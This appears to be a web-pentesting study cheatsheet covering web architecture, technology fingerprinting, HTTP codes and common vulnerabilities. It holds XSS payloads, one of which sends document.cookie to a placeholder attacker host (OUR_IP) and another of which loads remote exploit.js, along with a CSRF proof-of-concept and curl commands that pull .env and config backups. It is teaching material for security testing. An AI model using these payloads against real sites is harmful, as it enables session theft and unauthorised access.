---
title: "Introduction to Web Applications"
description: "Web architecture, technologies, HTTP, cookies, and basic security."
sidebar:
  order: 5
  label: "Introduction to Web Applications"
---
> Web application architecture, frontend/backend technologies, and fundamental vulnerabilities. Conceptual foundation for all other CWES modules.

---


## Web Architecture — Common Models

| Model | Description | Risk |
|--------|-------------|--------|
| **One Server** | Everything on one server | All-in-one: one failure = everything compromised |
| **Many Servers - One DB** | Several app servers, one DB | Partial segmentation |
| **Many Servers - Many DBs** | Fully distributed | Greater security, harder to compromise |
| **Microservices** | Independent stateless components | Attack surface expanded by more endpoints |
| **Serverless** | Cloud container functions | Difficult to persist, exfiltration via API |

### The Three Tiers of Architecture

| Tier | Technologies | What to Attack |
|------|-------------|------------|
| **Presentation** | HTML, CSS, JS, React, Angular | XSS, HTML Injection, client-side JS |
| **Application** | PHP, Python, Java, .NET, Node.js | SQLi, LFI, RCE, auth bypass |
| **Data** | MySQL, PostgreSQL, MongoDB, Redis | SQLi, NoSQLi, data exposure |

---

## Web Servers — Identification

| Web Server | Port | Identifiers |
|------------|--------|-----------------|
| **Apache** | 80/443 | `Server: Apache/2.x.x`, `.htaccess`, `/server-status` |
| **NGINX** | 80/443 | `Server: nginx/1.x.x`, configuration in `/etc/nginx/` |
| **IIS** | 80/443 | `Server: Microsoft-IIS/10.0`, `.aspx`, `.asp` extensions |
| **Tomcat** | 8080/8443 | `/manager/html`, `.jsp`, `.war` files |
| **Node.js** | varies | `X-Powered-By: Express`, JSON responses, `.js` endpoints |

```bash
# Identify web server via headers
curl -I http://TARGET/
# Search for: Server, X-Powered-By, X-Generator, Content-Type

# Whatweb — fingerprinting
whatweb http://TARGET/

# Wappalyzer (Firefox/Chrome extension) — detected technologies
```

---

## Databases — Types and Identification

| Type | DB | Identification | Injection |
|------|----|----------------|-----------|
| **SQL** | MySQL | `MySQL error`, port 3306, `information_schema` | SQLi |
| **SQL** | MSSQL | IIS + `.aspx`, port 1433, `@@version` | SQLi |
| **SQL** | PostgreSQL | `pg_` prefixes, port 5432 | SQLi |
| **SQL** | SQLite | `.db`, `.sqlite3` files, small apps | SQLi |
| **NoSQL** | MongoDB | Port 27017, JSON responses, `$where` | NoSQLi |
| **NoSQL** | Redis | Port 6379, `KEYS *` without auth | SSRF, auth bypass |

---

## Common Technology Stacks

| Stack | Components | What to Look For |
|-------|-------------|------------|
| **LAMP** | Linux + Apache + MySQL + PHP | PHP shells, SQLi, LFI in `?page=` |
| **MEAN** | MongoDB + Express + Angular + Node | NoSQLi, prototype pollution |
| **WINS** | Windows + IIS + .NET + SQL Server | ASPX upload, MSSQL xp_cmdshell |
| **Django** | Python + PostgreSQL | SSTI in templates, Python deserialization |
| **Laravel** | PHP + MySQL | SQLi, debug mode RCE |

---

## HTTP Response Codes — Quick Reference

| Code | Meaning | Implications for Pentesting |
|------|---------|-----------------------------|
| `200 OK` | Success | Resource exists and is accessible |
| `301/302` | Redirect | Follow the chain, can reveal paths |
| `400` | Bad Request | Check payload syntax |
| `401` | Unauthorized | Auth required → try bypass |
| `403` | Forbidden | Resource exists → try access bypass |
| `404` | Not Found | Does not exist (or hidden) |
| `405` | Method Not Allowed | Test other HTTP verbs |
| `500` | Internal Server Error | Server error → can reveal stack trace |
| `502/504` | Gateway Error | Proxy/load balancer in the middle |

```bash
# Verify response code
curl -s -o /dev/null -w "%{http_code}" http://TARGET/path
```

---

## Frontend Vulnerabilities — Reference

### Sensitive Data Exposure (SDE)

```bash
# Check source code
curl -s http://TARGET/ | grep -iE "password|secret|key|token|api|TODO|FIXME|admin"

# View source in browser: Ctrl+U or view-source:http://TARGET/
# Search in HTML comments: <!-- ... -->
# Search for .bak, .old, .swp, temporary editor files
curl http://TARGET/.htpasswd
curl http://TARGET/config.php.bak
curl http://TARGET/index.php~

# Common configuration files
curl http://TARGET/.env
curl http://TARGET/config.js
curl http://TARGET/wp-config.php
```

### HTML Injection → XSS

| XSS Type | Location | Basic Payload |
|----------|----------|----------------|
| **Reflected** | GET/POST parameter reflected directly | `<script>alert(1)</script>` |
| **Stored** | Comment/profile stored in DB | `<img src=x onerror=alert(document.cookie)>` |
| **DOM** | JS manipulates DOM with user input | `#"><img src=/ onerror=alert(document.cookie)>` |

```javascript
// Basic XSS test
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)

// Steal cookie (stored XSS)
<script>new Image().src='http://OUR_IP/steal?c='+document.cookie</script>

// CSRF via XSS
"><script src=http://OUR_IP/exploit.js></script>
```

### CSRF

```html
<!-- Basic CSRF PoC -->
<form action="http://TARGET/change-password" method="POST">
  <input type="hidden" name="password" value="hacked123">
  <input type="hidden" name="confirm" value="hacked123">
</form>
<script>document.forms[0].submit();</script>
```

---

## Key Web Security Concepts

### URL Encoding — Reference Table

| Character | Encoding | Use in Attacks |
|-----------|----------|----------------|
| space | `%20` or `+` | Word filter bypass |
| `'` | `%27` | SQLi without quotes |
| `"` | `%22` | XSS bypass |
| `<` | `%3C` | XSS bypass |
| `>` | `%3E` | XSS bypass |
| `/` | `%2F` | Path traversal bypass |
| `&` | `%26` | Parameter separator |
| `#` | `%23` | SQL comment |
| `=` | `%3D` | Parameters |
| `\n` | `%0A` | Command injection |

```bash
# Encode/decode URL with Python
python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1--\"))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('%27%20OR%201%3D1--'))"
```

### DOM — Relevant Concepts

```javascript
// Accessing DOM elements (for XSS)
document.getElementById("id")
document.getElementsByClassName("class")
document.cookie                    // user session
document.location                  // current URL
document.referrer                  // previous page
window.localStorage                // local storage
```

---

## OWASP Top 10 — CWES Modules Map

| # | Vulnerability | CWES Module |
|---|---------------|-------------|
| 1 | Broken Access Control | [Broken Authentication](/en/metodologias/web/broken-authentication/) |
| 2 | Cryptographic Failures | [Broken Authentication](/en/metodologias/web/broken-authentication/) |
| 3 | Injection (SQLi, SSTI, CMDi) | [Server-side Attacks](/en/metodologias/web/server-side-attacks/) |
| 4 | Insecure Design | [API Attacks](/en/metodologias/web/api-attacks/) |
| 5 | Security Misconfiguration | [Web Fuzzing](/en/metodologias/recon/web-fuzzing/) |
| 6 | Vulnerable & Outdated Components | [Bug Bounty Hunting Process](/en/metodologias/web/bug-bounty-hunting-process/) |
| 7 | Identification & Auth Failures | [Broken Authentication](/en/metodologias/web/broken-authentication/) |
| 8 | Software & Data Integrity Failures | [API Attacks](/en/metodologias/web/api-attacks/), [Attacking GraphQL](/en/metodologias/web/attacking-graphql/) |
| 9 | Security Logging Failures | [Bug Bounty Hunting Process](/en/metodologias/web/bug-bounty-hunting-process/) |
| 10 | SSRF | [Server-side Attacks](/en/metodologias/web/server-side-attacks/) |

---

## Quick Technology Fingerprinting

```bash
# HTTP Headers
curl -sI http://TARGET/ | grep -iE "server|x-powered|content-type|set-cookie|x-generator"

# HTML meta tags
curl -s http://TARGET/ | grep -iE "<meta|generator|framework|cms"

# Revealing files
curl -s http://TARGET/robots.txt          # allowed/disallowed paths
curl -s http://TARGET/sitemap.xml         # site structure
curl -s http://TARGET/README.md           # project info
curl -s http://TARGET/CHANGELOG.md        # versions
curl -s http://TARGET/package.json        # Node.js dependencies
curl -s http://TARGET/composer.json       # PHP dependencies
curl -s http://TARGET/requirements.txt    # Python dependencies
```

---

## Pitfalls / Gotchas

- **SDE in HTML comments:** always Ctrl+U before any other action. Test credentials in comments are more common than it seems.
- **403 ≠ does not exist:** a 403 confirms the resource exists. Attempt bypass using alternative methods, headers (`X-Original-URL`, `X-Rewrite-URL`), or path normalization.
- **JS frameworks hide logic:** Angular, React, and Vue render on the client side → inspect the JS bundle to find API endpoints.
- **NoSQL ≠ immune to injection:** MongoDB has its own injection syntax (`$where`, `$gt`, `$regex`).
- **CSRF tokens:** verify if the token is validated on the server. Sometimes it is only generated on the client side (JS) without server-side validation.
- **SameSite cookie:** `SameSite=Strict` mitigates CSRF but not XSS. `SameSite=Lax` allows CSRF with top-level GET navigation.
- **`robots.txt` is not security:** it lists the paths that bots should NOT index → these are direct clues to sensitive paths.

---

## Related Cheatsheets

- [Web Requests](/en/metodologias/fundamentos/web-requests/) — HTTP in-depth, cURL, headers, authentication
- [Web Fuzzing](/en/metodologias/recon/web-fuzzing/) — discovering paths, parameters, and technology
- [JavaScript Deobfuscation](/en/metodologias/recon/javascript-deobfuscation/) — analyzing frontend JS code
- [Server-side Attacks](/en/metodologias/web/server-side-attacks/) — SSRF, SSTI, and other backend vulnerabilities
- [Broken Authentication](/en/metodologias/web/broken-authentication/) — sessions, cookies, JWT, MFA bypass
